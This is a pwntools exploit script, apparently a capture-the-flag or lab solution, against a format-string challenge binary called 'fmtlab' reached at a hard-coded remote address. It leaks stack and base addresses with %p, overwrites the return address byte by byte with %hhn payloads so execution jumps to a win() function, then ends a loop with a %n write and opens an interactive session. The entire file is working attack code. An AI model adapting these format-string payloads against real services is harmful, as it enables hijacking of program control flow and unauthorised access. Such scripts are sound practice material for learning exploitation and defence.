from pwn import *

# p = process('./fmtlab')
p = remote('140.112.31.97', 30104)
elf = ELF('./fmtlab')

# leak rsp
p.sendlineafter('message : ', '%12$p')
rsp = int(p.recvuntil('Y')[:-1], 16) - 0x120
success('rsp = 0x%x', rsp)

# leak main address
p.sendlineafter('message : ', '%19$p')
main = int(p.recvuntil('Y')[:-1], 16)
base = main - elf.sym['main']
success('base address = 0x%x', base)

# overwrite return address to win()
ret_addr = rsp + 72
win = base + elf.sym['win'] + 1
for i in range(6):
    payload = b'%' + str(win&0xff).encode() + b'c%10$hhn'
    payload = payload.ljust(16, b'a') + p64(ret_addr+i)
    p.sendlineafter('message : ', payload)
    win = win>>8

# overwrite end to 0 to break the loop
end = rsp + 0xc
payload = b'%9$n'.ljust(8, b'a') + p64(end)
p.sendlineafter('message : ', payload)

p.interactive()
